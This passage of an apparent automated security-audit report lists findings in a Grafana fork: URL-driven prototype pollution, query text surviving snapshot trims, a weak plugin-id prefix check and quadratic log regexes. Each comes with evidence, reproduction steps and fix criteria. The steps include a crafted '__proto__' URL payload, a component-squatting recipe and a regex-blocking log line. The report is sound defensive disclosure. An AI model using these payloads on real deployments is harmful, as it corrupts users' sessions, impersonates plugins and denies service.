2. [public/app/features/explore/Logs/LogsTableWrap.tsx:184–255](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/Logs/LogsTableWrap.tsx#L184-L255)
   pendingLabelState is created as `{}` or `Object.fromEntries(labelCardinality)` (Object.prototype-backed) and handed to getColumnsFromProps at line 255 inside the effect that runs whenever currentDataFrame has rows, so the write happens on every logs-table result render while the URL state is present.
3. [public/app/features/explore/hooks/useStateSync/migrators/v1.ts:98–122](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/migrators/v1.ts#L98-L122)
   applyDefaults copies `panelsState` from the JSON.parse'd `panes` URL parameter verbatim, checking only `typeof === 'object'`; panelsState.logs.columns and panelsState.logs.visualisationType are therefore attacker-shaped.
4. [public/app/features/explore/hooks/useStateSync/synchronizer/init.ts:80–93](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/synchronizer/init.ts#L80-L93)
   initializeFromURL dispatches initializeExplore with the URL panelsState; explorePane.ts initializeExplore then dispatches changePanelsStateAction({exploreId, panelsState}) unchanged into the pane store, from which LogsContainer.mapStateToProps (item.panelsState) feeds Logs -> ControlledLogRows -> ControlledLogsTable -> LogsTableWrap.
5. [public/app/features/explore/Logs/Logs.tsx:897–927](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/Logs/Logs.tsx#L897-L927)
   visualisationType is seeded from panelState?.logs?.visualisationType (line 214/329). When it is 'table', logRows is non-empty and the logsTablePanelNG flag is at its generated default `false` (useFlagLogsTablePanelNG, recovered from public/build/6540.*.js.map), Explore renders ControlledLogRows with panelState={panelState?.logs}, mounting LogsTableWrap.
6. [public/app/features/logs/logsFrame.ts:43–59](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/logsFrame.ts#L43-L59)
   Concrete gadget: logFrameLabelsToLabels iterates `for (const k in logFrameLabels)` with no own-property check. After pollution the inherited boolean `active` forces needsSerialization and the second loop copies `active: 'true'` and `index: '<k>'` into every log line's Labels object, so phantom attacker-chosen labels appear on all log rows and in label-driven UI for the rest of the session.
7. [public/app/plugins/panel/heatmap/utils.ts:631–633](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/heatmap/utils.ts#L631-L633)
   Concrete availability gadget: `let fillPalette = disp.fill.index ?? [...new Set(fills)]` — with Object.prototype.index set, disp.fill.index is the attacker's integer instead of undefined, and `fillPalette.map(...)` on a number throws, breaking heatmap rendering in the polluted session.

## Impact
Property names are fixed (`active`, `index`) and values are `true` / an attacker-chosen small integer, so there is no data disclosure. Integrity LOW: client-side application state is deterministically altered for the whole session — e.g. logsFrame.ts's for…in label loop injects phantom `active`/`index` labels onto every log line, queryIsEmpty misreports every query, breadcrumb/nav code treats every child as active. Availability LOW: the heatmap renderer's `disp.fill.index ?? [...]` yields a number and `fillPalette.map` throws, breaking those panels until a full reload; other inherited-`index` consumers may fail similarly.

## Reproduction steps
1. An unauthenticated attacker crafts an Explore link whose `panes` JSON carries `panelsState.logs = { visualisationType: 'table', columns: ['__proto__'] }` plus a query against a log-producing datasource (e.g. a Loki instance named in the link, or the victim's default/last-used datasource) and gets a signed-in user to open it. Explore runs the URL query, renders the legacy logs table (flag default false in this build) and `getColumnsFromProps` writes onto Object.prototype with no defence in the way. Attack requirements are PRESENT because success depends on the deployment having a datasource that returns log rows for the attacker's query and on the attacker addressing it; otherwise the table never renders and the effect never fires.

## Recommended fix
1. getColumnsFromProps indexes a plain object with URL-supplied keys and mutates whatever it finds, so inherited properties such as `__proto__`/`constructor` are treated as columns and written to. Fix criteria: Column names taken from `panelState.columns` must only affect own, data properties of the column-meta store (e.g. `Object.hasOwn(fieldNames, key)` check, or store column meta in a `Map`/null-prototype object). After the fix, loading an Explore URL with `columns: ['__proto__']` or `['constructor']` must leave `Object.prototype` and `Object` unchanged and must simply ignore the unknown column.
2. The URL-state migrator and `initializeExplore` accept `panelsState` of any shape, so every consumer of `panelsState.logs.*` receives unvalidated attacker-shaped data. Fix criteria: Validate `panelsState.logs` on ingest (columns is an array/record of strings excluding prototype-sensitive keys; visualisationType is one of the known values) and drop anything else before dispatching into the store, so no downstream consumer can be reached with hostile keys.

---
**Severity:** LOW
**Status:** Open
**Category:** Prototype pollution
**CWE:** [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256251

---

# V2 snapshot trim keeps full annotation queries and datasource refs in published snapshots

## Details
When a dashboard snapshot is published for a v2-schema dashboard (the default: shouldForceV2API() is the GA, default-on dashboardNewLayouts toggle), ShareSnapshotTab.prepareSnapshot() serializes with transformSceneToSaveModelSchemaV2(scene, true) and then calls the v2 trimDashboardForSnapshot(). The drawer text and the product docs promise that queries, including annotation queries, are removed.

getAnnotations() runs regardless of isSnapshot and emits each annotation layer as an AnnotationQueryKind whose spec.query is built by transformV1ToV2AnnotationQuery: `group` = datasource type, `datasource.name` = datasource uid (when the annotation had an explicit ref), `spec` = the annotation's `target`, i.e. the executable annotation query (PromQL/LogQL expr, SQL rawSql, Elasticsearch query, CloudWatch namespace/metric/dimensions, tag filters). The v2 trim then rebuilds each enabled annotation as {name, enable, iconColor, builtIn, hide, query: annotation.spec.query} — copying the whole DataQueryKind verbatim. The v1 counterpart (transformSceneToSaveModel.ts trimDashboardForSnapshot) deliberately drops the query and emits snapshotData: [] with the comment 'to avoid annotation queries in snapshots'; the v2 port lost that scrub, no test covers the v2 trim, and the same code ships in public/build/6540.a30454ce5fbe65a84f5f.js. (The built-in '-- Grafana --' annotation's target is benign {type, limit, tags, matchAny}; the disclosure is every datasource-backed annotation.)

The payload is POSTed to /api/snapshots and, with the external option (external_enabled = true by default), forwarded to the configured external snapshot server. Snapshots are readable by anyone holding the key, including anonymous users (routes.tsx:109 allowAnonymous for snapshot routes; docs: 'Anyone with the link can access the snapshot'). On load, transformSaveModelSchemaV2ToScene creates no annotation layers for snapshots, so the queries are never re-executed — the retained text has no function and is pure stored/returned disclosure in the snapshot JSON.

Impact: disclosure of annotation query text and datasource type/uid (internal hostnames, table/index names, label selectors, tenant ids, credentials some users embed in query strings) to every snapshot recipient and, for external snapshots, to a third party, contrary to the product's explicit promise and the v1 behaviour. This is the annotation sibling of the verified `v2-snapshot-trim-does-not-strip-panel-links` (same function, lines 778-786, panel links); it is a distinct sink filed separately so a fix of the links check does not close it.

## Evidence
1. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts:788–803](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts#L788-L803)
   trimDashboardForSnapshot (v2) rebuilds each enabled annotation as {name, enable, iconColor, builtIn, hide, query: annotation.spec.query}, copying the DataQueryKind verbatim: `group` (datasource type), `datasource.name` (datasource uid, when the source annotation had an explicit ref) and `spec` (the raw annotation target). Nothing is scrubbed. The shipped bundle public/build/6540.a30454ce5fbe65a84f5f.js contains the identical code (`kind:"AnnotationQuery",spec:{name:Ve.spec.name,...,query:Ve.spec.query}`).
2. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts:657–707](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts#L657-L707)
   getAnnotations() is called by transformSceneToSaveModelSchemaV2 without regard to isSnapshot (line 149) and emits every annotation layer with its resolved datasource type/uid and full query via transformV1ToV2AnnotationQuery, so the pre-trim spec carries the live annotation queries; only the trim could remove them.
3. [public/app/features/dashboard-scene/serialization/annotations.ts:38–60](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/annotations.ts#L38-L60)
   transformV1ToV2AnnotationQuery puts the annotation `target` (the query body: Prometheus/Loki expr, SQL rawSql, Elasticsearch query, CloudWatch namespace/metric/dimensions, tag filters) in spec.query.spec and the datasource uid in spec.query.datasource.name — exactly the fields the v2 trim keeps. standardAnnotationSupport.ts:46 (prepareQuery returns anno.target) confirms `target` is the executable query.
4. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts:1033–1051](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts#L1033-L1051)
   The v1 sibling trim reduces each annotation to name/enable/iconColor/type/builtIn/hide plus snapshotData: [], with the comment 'to avoid annotation queries in snapshots'. This is the shipped control the v2 port dropped.
5. [public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx:145–205](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx#L145-L205)
   prepareSnapshot() takes the v2 branch when the scene serializer's apiVersion starts with 'dashboard.grafana.app/v2', calls transformSceneToSaveModelSchemaV2(scene, true) then the v2 trim; onSnapshotCreate POSTs the result to /api/snapshots (SnapshotSrv.ts:54) with external=true|false. ShareSnapshot.tsx:21 (the share drawer) extends this class, so both the modal tab and the drawer use this path, for whole-dashboard and single-panel snapshots alike.
6. [public/app/features/dashboard-scene/serialization/transformSaveModelSchemaV2ToScene.ts:117–124](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSaveModelSchemaV2ToScene.ts#L117-L124)
   When a v2 snapshot is opened, no annotation layers are created (isSnapshot guard), so the retained query text and datasource refs serve no function in the snapshot: they are pure stored/returned disclosure in the GET /api/snapshots/<key> JSON.
7. [public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx:244–248](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx#L244-L248)
   The drawer text shown to the publisher states that snapshot creation strips 'queries (metric, template, and annotation)'; UpsertSnapshot.tsx:38-53 repeats the promise.
8. [docs/sources/visualizations/dashboards/share-dashboards-panels/\_index.md:120](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/docs/sources/visualizations/dashboards/share-dashboards-panels/_index.md#L120)
   Product documentation: 'A dashboard snapshot publicly shares a dashboard while removing sensitive data such as queries and panel links ... Anyone with the link can access the snapshot.'
9. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:1373–1375](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L1373-L1375)
   shouldForceV2API() is exactly config.featureToggles.dashboardNewLayouts, which docs/sources/setup-grafana/configure-grafana/feature-toggles/index.md:37 lists as GA and enabled by default, so dashboards get the v2 serializer and the v2 trim is the default snapshot path.
10. [conf/defaults.ini:584–589](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/conf/defaults.ini#L584-L589)
   [snapshots] enabled = true, external_enabled = true, external_snapshot_url = https://snapshots.raintank.io by default, so the un-scrubbed payload may also be forwarded to a third-party host when the publisher picks the external option.

## Impact
Confidential annotation query definitions and datasource uids/types that the product promises to remove are disclosed to unauthenticated snapshot readers and an external host. No integrity or availability impact on Grafana.

## Reproduction steps
1. Default v13 config (dashboardNewLayouts on, snapshots and external snapshots enabled). An editor whose dashboard has annotation queries publishes a snapshot normally, trusting the drawer text, and shares the link or publishes externally. Any holder of the snapshot key (anonymous) GETs /api/snapshots/<key> (or the external server) and reads spec.annotations[].spec.query.{group,datasource.name,spec}. No defenses to defeat; only the author's routine publish action is required.

## Recommended fix
trimDashboardForSnapshot (v2) copies annotation.spec.query into the trimmed annotation instead of removing the query and datasource reference, so the live annotation query and datasource uid survive into the published snapshot. Fix criteria: A v2 snapshot payload must contain no annotation query body or datasource reference for any annotation (only presentational fields such as name/enable/iconColor/builtIn/hide, matching the v1 trim). Verify by snapshotting a v2 dashboard whose annotation has a distinctive query string and datasource uid and asserting neither appears in the body sent to /api/snapshots; add a unit test on the v2 trim for this.

---
**Severity:** LOW
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-212](https://cwe.mitre.org/data/definitions/212.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256250

---

# Snapshot trims clear query variable `query` but leave `definition` holding the same query text

## Details
Both shipped snapshot trims — transformSceneToSaveModel.ts trimDashboardForSnapshot (v1, lines 1054-1067) and transformSceneToSaveModelSchemaV2.ts trimDashboardForSnapshot (v2, lines 806-820) — implement the drawer's 'we strip ... queries (metric, template, and annotation)' promise for variables by setting `query = ''`, collapsing `options` to `[current]` and setting `refresh = never`. Neither touches the query variable's `definition` field, which sceneVariablesSetToVariables (v1, line 102) and sceneVariablesSetToSchemaV2Variables (v2, line 420) serialize unconditionally for every QueryVariable. `definition` is not an independent description: QueryVariableEditor.getQueryDef() sets it to the query string itself, or to `query.query` for object-shaped queries (Prometheus `{qryType, query, refId}`, Elasticsearch `{query, field, find}`, SQL/string-query datasources), on every edit (lines 91, 187), and it round-trips through transformSaveModelToScene / transformSaveModelSchemaV2ToScene (line 435) from stored dashboards.

ShareSnapshotTab.prepareSnapshot() (lines 145-175) runs the respective trim and onSnapshotCreate POSTs the result to /api/snapshots via getDashboardSnapshotSrv().create (SnapshotSrv.ts:54), locally or forwarded to the external snapshot server (conf/defaults.ini [snapshots] external_enabled = true, external_snapshot_url = https://snapshots.raintank.io). The new share drawer (ShareButton/share-snapshot/ShareSnapshot.tsx) extends ShareSnapshotTab and uses the same path. The resulting snapshot carries, for every query variable, templating.list[].definition (v1) or variables[].spec.definition (v2) holding the verbatim template query text; the v1 trim additionally leaves templating.list[].datasource (uid/type) in place (in v2 the DataQueryKind object including its datasource name is replaced by '' and so is removed). Snapshots are readable by anyone holding the key (GET /api/snapshots/{key} per public/api-merged.json; UI text: 'can be viewed by anyone that has the link').

Assumption (backend out of scope, no Go source): the server stores the posted dashboard payload as-is; the API spec describes POST /snapshots as 'you have to provide the full dashboard payload' with no server-side scrubbing documented. The existing unit test ('should remove queries from variables', transformSceneToSaveModel.test.ts:1115) asserts only on `query`, `refresh` and `options`, so the gap is untested.

Impact: disclosure of template-variable query text (label selectors, tenant ids, internal hostnames, table/index names, tokens embedded in URL-style queries) and, for v1, datasource identifiers to every snapshot recipient including unauthenticated link holders and, when published externally, to a third-party host — contrary to what the author is told at publish time. This is a distinct sink from the verified `snapshot-collapsed-row-panels-keep-raw-queries` (panel targets in collapsed rows, transformSceneToSaveModel.ts:462) and `v2-snapshot-trim-does-not-strip-panel-links` (panel links, transformSceneToSaveModelSchemaV2.ts:778).

## Evidence
1. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts:1054–1066](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts#L1054-L1066)
   v1 trimDashboardForSnapshot scrubs each template variable by setting query='', options=[current] and refresh=never. It never touches `definition` or `datasource`, both of which the serializer emits for query variables; the primary fix location.
2. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts:806–819](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModelSchemaV2.ts#L806-L819)
   v2 trimDashboardForSnapshot has the same gap: variable.spec.query is replaced by '' (which also drops the DataQueryKind's datasource name) but variable.spec.definition is kept.
3. [public/app/features/dashboard-scene/serialization/sceneVariablesSetToVariables.ts:92–122](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/sceneVariablesSetToVariables.ts#L92-L122)
   sceneVariablesSetToVariables (v1 save model) emits `definition: variable.state.definition` (line 102) and `datasource` (lines 119-121) for every QueryVariable regardless of keepQueryOptions, so the pre-trim snapshot model contains the definition string.
4. [public/app/features/dashboard-scene/serialization/sceneVariablesSetToVariables.ts:413–437](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/sceneVariablesSetToVariables.ts#L413-L437)
   sceneVariablesSetToSchemaV2Variables likewise emits `definition: variable.state.definition` (line 420) into QueryVariableKind.spec.
5. [public/app/features/dashboard-scene/settings/variables/editors/QueryVariableEditor/QueryVariableEditor.tsx:273–280](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/settings/variables/editors/QueryVariableEditor/QueryVariableEditor.tsx#L273-L280)
   getQueryDef() derives `definition` directly from the query: the query string itself, or query.query for object queries. Both editor variants store it on every query change (lines 91 and 187, also for the legacy editor via onLegacyQueryChange={onQueryChange}), so `definition` is a verbatim copy of the template query text.
6. [public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx:145–198](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx#L145-L198)
   prepareSnapshot() selects the v1 or v2 trim and onSnapshotCreate POSTs the trimmed payload to /api/snapshots (local or external) through getDashboardSnapshotSrv().create; the share drawer's ShareSnapshot class extends this tab and reuses the same path.
7. [public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx:244–247](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx#L244-L247)
   The UI promises the author that template (variable) queries are stripped from the snapshot and that anyone with the link can view it; docs/sources/visualizations/dashboards/share-dashboards-panels/_index.md:120 states the same.
8. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.test.ts:1115–1127](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.test.ts#L1115-L1127)
   The existing 'should remove queries from variables' test asserts only query === '', refresh and options; `definition` is never checked, so the omission is untested.

## Impact
Template-variable query text and (v1) datasource identifiers the product explicitly promises to remove are disclosed to every snapshot reader, including unauthenticated link holders and a third-party host for external snapshots. Query text may embed label selectors, tenant ids, hostnames, table/index names or URL-embedded tokens, but no credentials or session material; no integrity or availability impact.

## Reproduction steps
1. Default configuration (snapshots enabled, external_enabled = true). A dashboard Editor with a query variable publishes a snapshot — local or to the external snapshot server — trusting the drawer text, and shares the link. Any holder of the snapshot key, unauthenticated, fetches GET /api/snapshots/<key> (or the external server) and reads templating.list[].definition / variables[].spec.definition, which equals the template query, plus (v1) the datasource uid/type. No control to defeat; the only user action is the victim author's routine publish (UI:ACTIVE). Assumes the backend stores the posted dashboard JSON without scrubbing (no Go source in checkout; API spec documents none).

## Recommended fix
The variable scrub in both snapshot trims only blanks `query`; `definition`, which the editor populates with the same query text, is serialized unconditionally by sceneVariablesSetToVariables / sceneVariablesSetToSchemaV2Variables and survives into the snapshot, as does the v1 variable `datasource` reference. Fix criteria: A snapshot payload (v1 and v2) must contain no query text for any template variable in any field: `definition` must be cleared (or omitted by the serializer when isSnapshot) and the v1 `datasource` reference removed, retaining only name/label/current/hide and the collapsed options. Verify by snapshotting a dashboard whose query variable has a distinctive query string and asserting that string is absent from the body posted to /api/snapshots; extend the trimDashboardForSnapshot unit tests for both schemas to assert on `definition` and `datasource`.

---
**Severity:** LOW
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-212](https://cwe.mitre.org/data/definitions/212.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256249

---

# Exposed component id check uses bare startsWith(pluginId), letting a plugin register ids under another plugin's namespace

## Details
ExposedComponentsRegistry.mapToRegistry (ExposedComponentsRegistry.ts:51) enforces exposed-component namespace ownership with a bare `id.startsWith(pluginId)`. The intended rule is that the segment before the first '/' equals the registering plugin's id: the error text says 'Id should be prefixed with plugin id', the test 'should skip registering component ... when id is not prefixed with plugin id' exercises it, plugin.schema.json documents the format `{PLUGIN_ID}/name-of-component/v1`, and the sibling check isExtensionPointIdValid (validators.ts:71-72) correctly tests `${pluginId}/`. `pluginId` is bound by the host from backend meta (pluginImporter.ts:100), but `id` is authored by the plugin (AppPlugin.exposeComponent) and the sandbox wrapper (sandboxComponents.tsx:78-92) passes ids through unchanged, so an app plugin whose id is a strict textual prefix of another installed app plugin's id can register `<victim-id>/<component>/v1`. Registration is first-wins (lines 56-58): with `preload: true` in its plugin.json the squatter is imported at boot (app.ts:316 -> getAppPluginsToPreloadSync, appUtils.tsx:144-152), before useLoadAppPlugins lazily imports the victim (owner resolved via split('/')[0], appUtils.tsx:18-20), so the victim's later registration is refused with EXPOSED_COMPONENT_ALREADY_EXISTS and every consumer of that id (usePluginComponent.tsx:52-60, in core or in other plugins) renders the squatter's component under the squatter's plugin context and hands it the props meant for the victim. The plugin.json cross-check at lines 66-72 runs only when isGrafanaDevMode(), never in shipped builds, and would only consult the squatter's own manifest anyway.

Condition under which it holds: the attacker's plugin id must be a strict prefix of the victim's. Under the documented naming convention (plugin.schema.json pattern `^[0-9a-z]+-([0-9a-z]+-)?(app|panel|datasource)$`) that forces both ids to share the org slug, e.g. 'acme-app' squatting 'acme-apple-app/...': catalog-conformant victims are plugins from the attacker's own publisher org, while plugins installed outside the convention (unsigned or privately signed ids) are unconstrained. Core consumers ('grafana-assistant-app/fullscreen-workspace/v1' in FullscreenWorkspaceShell.tsx, 'grafana-assistant-onboarding-app/nav-onboarding/v1' in AssistantNavOnboarding.tsx) are reachable only by an attacker id beginning 'grafana-', which the catalog reserves. Impact is cross-plugin impersonation and interference behind the Frontend Sandbox, whose documentation (docs/sources/administration/plugin-management/plugin-frontend-sandbox.md) promises it 'Stops plugins from interfering with other plugins functionality' and is recommended for 'Plugins from untrusted sources': the squatter shows its UI where the victim's component is expected, reads the props the consumer passes, and denies the victim's component for the whole session. An unsandboxed plugin is fully trusted by design, so the finding is the gap in the sandboxed case.

## Evidence
1. [public/app/features/plugins/extensions/registry/ExposedComponentsRegistry.ts:51–58](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/registry/ExposedComponentsRegistry.ts#L51-L58)
   The only ownership check is `id.startsWith(pluginId)` without the '/' separator, so plugin 'acme-app' may register 'acme-apple-app/<component>/v1'. Lines 56-58 make registration first-wins: the legitimate owner's later registration is refused with EXPOSED_COMPONENT_ALREADY_EXISTS. The plugin.json cross-check at 66-72 runs only in dev mode.
2. [public/app/features/plugins/importer/pluginImporter.ts:98–100](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/importer/pluginImporter.ts#L98-L100)
   The host binds `pluginId` to backend-supplied meta.id but takes `configs` (including each `id`) from the plugin's own exposedComponentConfigs, so the id string is plugin-authored and the registry's prefix test is the only control between a plugin and another plugin's namespace.
3. [public/app/features/plugins/extensions/validators.ts:71–72](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/validators.ts#L71-L72)
   The sibling extension-point check uses `extensionPointId.startsWith(`${pluginId}/`)`, showing the intended namespace rule includes the separator; the exposed-component registry omits it.
4. [public/app/features/plugins/extensions/usePluginComponent.tsx:52–59](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/usePluginComponent.tsx#L52-L59)
   Consumers (core and other plugins) render whatever registry item sits under the requested id, wrapped with the registering plugin's own context, so the squatter's component and the props destined for the victim's component meet here. The dependency restriction at line 22 is dev-mode only.
5. [public/app/features/plugins/extensions/appUtils.tsx:18–19](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/appUtils.tsx#L18-L19)
   Consumers resolve the owning plugin to load from `split('/')[0]`, i.e. the victim; the squatter is not loaded on demand, so it relies on `preload: true` (honoured by getAppPluginsToPreloadSync at 144-152 and app.ts:316) to register first.

## Impact
The squatting plugin receives the props the consumer passes to the victim's component (C:L) and renders attacker UI under the victim's identity at the victim's integration points (I:L); because registration is first-wins (lines 56-58) the victim's exposed component is refused and unavailable for the session (A:L). Reach is limited to what consumers pass to that component; it does not by itself cross out of the sandboxed plugin's realm.

## Reproduction steps
1. The attacker is the author of a non-Grafana app plugin an administrator has installed and sandboxed; the plugin's frontend module is served to every user's browser (AV:N). It needs only `preload: true` and an exposeComponent call with the victim's id (AC:L). It requires an installed victim app plugin whose id strictly extends the attacker's id - under the documented naming convention a same-org sibling such as 'acme-app' vs 'acme-apple-app', or unconventional ids - and that the attacker registers first (AT:P). The plugin reaches the page only through an administrator's install, the position the threat model names as adversary 5 (PR:H). The squat takes effect at boot and the impersonated component renders during ordinary browsing (UI:P).

## Recommended fix
Namespace ownership of exposed component ids is checked with a bare string prefix (`id.startsWith(pluginId)`) instead of requiring the exact plugin id followed by the '/' separator, unlike the sibling extension-point check in validators.ts. Fix criteria: An exposed component id is accepted only when the segment before its first '/' equals the registering pluginId exactly (e.g. `id.startsWith(`${pluginId}/`)`), and ideally only when the id is also listed in the registering plugin's own plugin.json `extensions.exposedComponents` in production builds. Verify that plugin 'acme-app' cannot register 'acme-apple-app/x/v1' and that the test suite covers a prefix-but-not-owner id.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper authorization
**CWE:** [CWE-187](https://cwe.mitre.org/data/definitions/187.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** HIGH
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256248

---

# Built-in log syntax-highlighting regexes are quadratic on long tokens from datasource content

## Details
The Prism grammar used to colour log lines (grammar.ts) contains two patterns whose matching time grows quadratically with the length of a single token in the line: `log-token-key` (`(\b|\B)[\w_]+(?=\s*=)`, line 9) and `log-token-size` (`(?:\b|")\d+\.{0,1}\d*\s*[kKmMGgtTPp]*[bB]{1}(?:"|\b)`, line 15). For a line containing a run of n word characters (or n digits) not followed by `=` (respectively a `b` unit), the backtracking engine performs on the order of n^2/2 steps before giving up. The grammar is executed by `Prism.tokenize` in `LogListModel.highlightedBodyTokens` (processing.ts:203) on the React render path for every visible row, and the cached tokens are discarded on every search or collapse change.

The line body is only truncated when the row is marked collapsed, and `updateCollapsedState` is only invoked from `getLogLineSize` when line wrapping is enabled (virtualization.ts:288 returns early for `!wrap`). The Logs panel's `wrapLogMessage` option defaults to false (module.tsx:69), so a dashboard Logs panel highlights the full raw line; Explore defaults wrapping to on (Logs.tsx:186, `store.getBool(SETTINGS_KEYS.wrapLogMessage, true)`) and is exposed only when the user has turned wrapping off. Nothing upstream (logsModel.ts dataFrameToLogsModel) caps line length. Loki accepts lines up to its `max_line_size` (256 KB by default) and Elasticsearch has no such limit, so a single log line consisting of ~100,000 digits or word characters costs ~5x10^9 regex steps - tens of seconds to minutes of main-thread blocking - every time it is rendered.

